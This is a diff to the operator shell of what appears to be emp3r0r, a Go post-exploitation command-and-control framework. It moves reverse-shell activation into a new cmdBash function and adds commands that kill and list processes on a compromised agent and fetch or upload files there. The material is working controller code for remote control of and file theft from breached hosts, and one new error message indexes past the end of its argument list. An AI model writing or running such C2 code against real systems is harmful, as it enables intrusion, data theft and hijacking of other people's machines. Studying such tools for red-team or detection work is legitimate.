@@ -71,7 +71,8 @@ shell:
 	for {
 		// set prompt to shell
 		EmpReadLine.SetPrompt(color.HiMagentaString("shell [%d] > ", tControl.Index))
-		defer EmpReadLine.SetPrompt(color.CyanString("emp3r0r > "))
+		oldPrompt := EmpReadLine.Config.Prompt
+		defer EmpReadLine.SetPrompt(oldPrompt)
 
 		// read user input
 		input, err := EmpReadLine.Readline()
@@ -103,33 +104,45 @@ shell:
 			continue shell
 
 		case input == "bash":
-			// activate reverse shell in agent
-			token := uuid.New().String()
-			RShellStream.Text = token
-			cmd := fmt.Sprintf("bash %s", token)
-			err := SendCmd(cmd, CurrentTarget)
-			if err != nil {
-				CliPrintError("Cannot activate reverse shell on remote target: ", err)
+			if err = cmdBash(); err != nil {
 				return
 			}
-			// wait for agent to send shell
-			for {
-				if RShellStream.H2x.Ctx != nil && RShellStream.H2x.Conn != nil {
-					break
-				}
-				time.Sleep(200 * time.Millisecond)
-			}
-
-			// launch local terminal to use remote bash shell
-			send := make(chan []byte)
-			reverseBash(RShellStream.H2x.Ctx, send, RShellStream.Buf)
-			time.Sleep(1 * time.Second)
 			break shell
 
-		case inputSlice[0] == "#put":
+		case inputSlice[0] == "#kill":
+			if len(inputSlice) < 2 {
+				CliPrintError("#kill <pids to kill>")
+				continue shell
+			}
+			err = SendCmd("#kill "+strings.Join(inputSlice[1:], " "), target)
+			if err != nil {
+				CliPrintError("failed to send command: %v", err)
+				continue shell
+			}
+
+		case inputSlice[0] == "#ps":
+			err = SendCmd("#ps", target)
+			if err != nil {
+				CliPrintError("failed to send command: %v", err)
+				continue shell
+			}
+
+		case inputSlice[0] == "get":
+			// #put file to agent
+			if len(inputSlice) != 2 {
+				CliPrintError("get <remote path>")
+				continue shell
+			}
+
+			if err = GetFile(inputSlice[1], target); err != nil {
+				CliPrintError("Cannot get %s: %v", inputSlice[2], err)
+			}
+			continue shell
+
+		case inputSlice[0] == "put":
 			// #put file to agent
 			if len(inputSlice) != 3 {
-				CliPrintError("#put <local path> <remote path>")
+				CliPrintError("put <local path> <remote path>")
 				continue shell
 			}
 
@@ -179,4 +192,31 @@ shell:
 		}
 	}
 	CliPrintSuccess("\n[*] shell[%d] finished", tControl.Index)
+}
+
+func cmdBash() (err error) {
+	// activate reverse shell in agent
+	token := uuid.New().String()
+	RShellStream.Text = token
+	cmd := fmt.Sprintf("bash %s", token)
+	err = SendCmd(cmd, CurrentTarget)
+	if err != nil {
+		CliPrintError("Cannot activate reverse shell on remote target: ", err)
+		return
+	}
+
+	// wait for agent to send shell
+	for {
+		if RShellStream.H2x.Ctx != nil && RShellStream.H2x.Conn != nil {
+			break
+		}
+		time.Sleep(200 * time.Millisecond)
+	}
+
+	// launch local terminal to use remote bash shell
+	send := make(chan []byte)
+	reverseBash(RShellStream.H2x.Ctx, send, RShellStream.Buf)
+	time.Sleep(1 * time.Second)
+
+	return
 }
